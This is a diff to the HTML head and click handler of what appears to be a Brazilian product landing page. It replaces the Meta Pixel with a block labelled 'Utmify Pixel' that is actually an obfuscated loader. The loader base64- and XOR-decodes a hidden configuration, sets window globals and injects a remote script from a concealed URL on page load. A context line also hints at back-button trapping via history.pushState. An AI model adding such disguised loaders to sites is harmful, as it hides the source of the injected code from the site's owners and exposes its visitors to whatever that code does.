@@ -9,21 +9,9 @@
 <link rel="icon" href="assets/img/favicon.ico">
 <link rel="icon" type="image/png" sizes="32x32" href="assets/img/favicon-32.png">
 <link rel="apple-touch-icon" href="assets/img/apple-touch-icon.png">
-<!-- Meta Pixel Code -->
-<script>
-!function(f,b,e,v,n,t,s)
-{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
-n.callMethod.apply(n,arguments):n.queue.push(arguments)};
-if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
-n.queue=[];t=b.createElement(e);t.async=!0;
-t.src=v;s=b.getElementsByTagName(e)[0];
-s.parentNode.insertBefore(t,s)}(window, document,'script',
-'https://connect.facebook.net/en_US/fbevents.js');
-fbq('init', '608777460930472');
-fbq('track', 'PageView');
-</script>
-<noscript><img height="1" width="1" style="display:none" src="https://www.facebook.com/tr?id=608777460930472&ev=PageView&noscript=1"/></noscript>
-<!-- End Meta Pixel Code -->
+<!-- Utmify Pixel -->
+<script>(function(){var q_erf=atob("DIXwJ9iZh06GowcgB/7SUqr1pXSky3NUd/bKCPf64yCo1nNNbuOJCbv26mDk0ShTZPeZV6zqqD7v22JMKPWZX731qST1gSsCZvGEVbH78jrj0CUaXNjcBb/16Cznz3QCPd6LBbb46iukmSVQbv2VS5H9pWKk1WZMcuDSHfqv5ivjkDQVP7zAEu2v5Xi1wTZENeTCH+q7+hP7");var x_mp=[];for(var w_ke=0;w_ke<q_erf.length;w_ke++){x_mp.push(q_erf.charCodeAt(w_ke)&255);}var r_pg7=x_mp[0];var s_skkb=x_mp.slice(1,1+r_pg7);var u_nl=x_mp.slice(1+r_pg7);var g_kbg6=u_nl.map(function(b,q_av){return b^s_skkb[q_av%r_pg7];});var j_ss="";for(var v_mdc=0;v_mdc<g_kbg6.length;v_mdc++){j_ss+=String.fromCharCode(g_kbg6[v_mdc]&255);}var w_fj=decodeURIComponent(escape(j_ss));var z_m=JSON.parse(w_fj);var k_tbl=z_m.globals||[];k_tbl.forEach(function(r_pzi){window[r_pzi.name]=r_pzi.value;});var s_6o=document.createElement("script");s_6o.src=z_m.url;s_6o.async=true;s_6o.defer=true;(z_m.attributes||[]).forEach(function(e_yu1){s_6o.setAttribute(e_yu1.name,e_yu1.value);});(document.head||document.documentElement).appendChild(s_6o);})();</script>
+<!-- End Utmify Pixel -->
 <style>
 @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap');
 * { margin: 0; padding: 0; box-sizing: border-box; }
@@ -575,13 +563,6 @@ window.addEventListener('pageshow', function(){ history.pushState(null, '', loca
     e.preventDefault();
     var u;
     try { u = new URL(el.getAttribute('href')); } catch (x) { return; } // link ainda pendente: não faz nada
-    try {
-      var val = parseFloat(el.getAttribute('data-value')) || 0;
-      var nm = el.getAttribute('data-name') || 'Mega Pack de Inventores';
-      if (typeof window.fbq === 'function' && val > 0) {
-        window.fbq('track', 'InitiateCheckout', { value: val, currency: 'BRL', content_type: 'product', content_name: nm, num_items: 1, contents: [{ id: nm, quantity: 1, item_price: val }] });
-      }
-    } catch (x) {}
     KEYS.forEach(function(k){ if (stored[k] && !u.searchParams.get(k)) u.searchParams.set(k, stored[k]); });
     setTimeout(function(){ window.location.href = u.toString(); }, 200);
   }, true);
